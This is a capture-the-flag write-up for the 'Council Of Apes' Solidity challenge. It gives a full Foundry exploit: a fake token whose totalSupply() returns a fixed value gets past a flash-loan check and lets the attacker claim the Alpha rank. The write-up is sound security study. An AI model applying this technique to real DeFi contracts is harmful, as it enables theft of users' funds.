## Weakness  
The Council Of Apes group of contracts is represented in the task.  
The task is to get the Alpha rank in a minor contract. For this purpose, it is
necessary to get many protocol tokens. Among the protocol contracts, there is
a pool contract for swap operations, as well as the ability to do flashLoan.  
The Pool consists of a derived token and a protocol token.  
Flashloan checks, has security mechanisms, including checking the ratio in the
pool and checking the totalSupply in the derived token contract.

The weakness is that the totalSupply of the derived token cannot be trusted,
as it may not be equal to the current token emission.

## Exploit

```solidity  
// SPDX-License-Identifier: UNLICENSED  
pragma solidity ^0.8.13;

import "forge-ctf/CTFSolver.sol";  
import "forge-std/console.sol";  
import "forge-std/Vm.sol";  
import "src/Setup.sol";

contract ShyToken is TotallyNotCopiedToken {  
   constructor(address _owner, string memory _name, string memory _symbol)
TotallyNotCopiedToken(_owner, _name, _symbol) {  
   }  
   function totalSupply() public view override returns (uint256) {  
       return 1337;  
   }  
}

contract Exploit {  
   Setup target;  
   IcyExchange exchange;  
   CouncilOfApes council;  
   TotallyNotCopiedToken token;  
   TotallyNotCopiedToken icyToken;

   constructor(Setup _target, IcyExchange _exchange, CouncilOfApes _council) {  
       target = _target;  
       exchange = _exchange;  
       council = _council;  
       token = new ShyToken(address(this), "Shy token", "SHY");  
       icyToken = exchange.icyToken();  
   }  
   function exploit() public payable {  
       // Become an ape  
       council.becomeAnApe(  
           keccak256("I hereby swear to ape into every shitcoin I see, to never sell, to never surrender, to never give up, to never stop buying, to never stop hodling, to never stop aping, to never stop believing, to never stop dreaming, to never stop hoping, to never stop loving, to never stop living, to never stop breathing")  
       );  
       // Create pool with our token  
       token.approve(address(exchange), type(uint256).max);  
       icyToken.approve(address(exchange), type(uint256).max);  
       icyToken.approve(address(council), type(uint256).max);  
       exchange.createPool{value: 1 ether}(address(token));  
       IcyPool pool = exchange.getPool(address(token));  
       exchange.collateralizedFlashloan(address(token), 100000000000000, address(this));

   }

   function receiveFlashLoan(uint256 amount) external payable {  
       council.buyBanana(1_000_000_000);  
       council.vote(address(this), 1_000_000_000);  
       council.claimNewRank();  
       council.issueBanana(1_000_000_000, address(this));  
       council.sellBanana(1_000_000_000);  
       council.dissolveCouncilOfTheApes(  
           keccak256("Kevin come out of the basement, dinner is ready.")  
       );  
   }  
}

contract Solve is CTFSolver {  
   function solve(address challenge, address player) internal override {  
       Setup setup = Setup(challenge);  
       IcyExchange exchange = setup.TARGET();  
       CouncilOfApes council = exchange.council();  
       TotallyNotCopiedToken icyToken = exchange.icyToken();  
       vm.label(address(exchange), "exchange");  
       vm.label(address(council), "council");  
       vm.label(address(icyToken), "icyToken");

       // Setup  
       Exploit exploit = new Exploit(setup, exchange, council);  
       vm.label(address(exploit), "exploit");

       // Exploit  
       exploit.exploit{value: 1 ether}();  
       console.log("isSolved", setup.isSolved());  
   }  
}  
```